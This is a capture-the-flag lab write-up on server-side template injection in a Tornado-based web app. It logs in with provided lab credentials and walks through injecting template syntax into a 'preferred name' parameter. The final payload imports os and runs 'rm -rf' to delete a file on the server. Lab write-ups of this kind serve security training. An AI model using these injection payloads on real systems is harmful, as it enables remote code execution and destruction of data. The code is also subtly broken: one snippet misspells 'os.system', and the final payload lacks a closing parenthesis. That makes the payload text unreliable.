# Lab: Basic server-side template injection (code context)

## Description
```
This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template.
To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
You can access your own account with following credentials:
    username = wiener
    password = peter
Tip: Take a closer look at the "preferred name" functionality.
```

## Solution
* First we login with the credentials provided to us.
* Then we visit the "My Account" Section.
* As it is given in the description, to view the preferred name functionality
* Intercept the request and we see the request params as ```blog-post-author-display=user.name&csrf=R5e6WncDa4SdU0voYFANDmILp95PqGE4```
* We change it to the following (with escaping braces) ```blog-post-author-display=user.name}}{{7*7}}&csrf=R5e6WncDa4SdU0voYFANDmILp95PqGE4```
* After we submit this request, we visit any blog and post a comment, and we can see that in our comment we have the name displayed as "Weiner49". This
  means we have SSTI successfully.
* Now to remove the morale.txt file, we use the python os module (As the Template engine uses python in it's backend).
* Python code to remove a file
* ``` import os; os.sytem('rm -rf /home/carlos/morale.txt')```
* We tweak it to fit into torando's syntax and get the following final payload. (Url encode this before sending)
* ```blog-post-author-display=user.name}}{%import os%}{{os.system("rm -rf /home/carlos/morale.txt"}}&csrf=R5e6WncDa4SdU0voYFANDmILp95PqGE4```
* After this is submitted, visit the blog on which you commented, and it will execute, hence compeleting the lab.
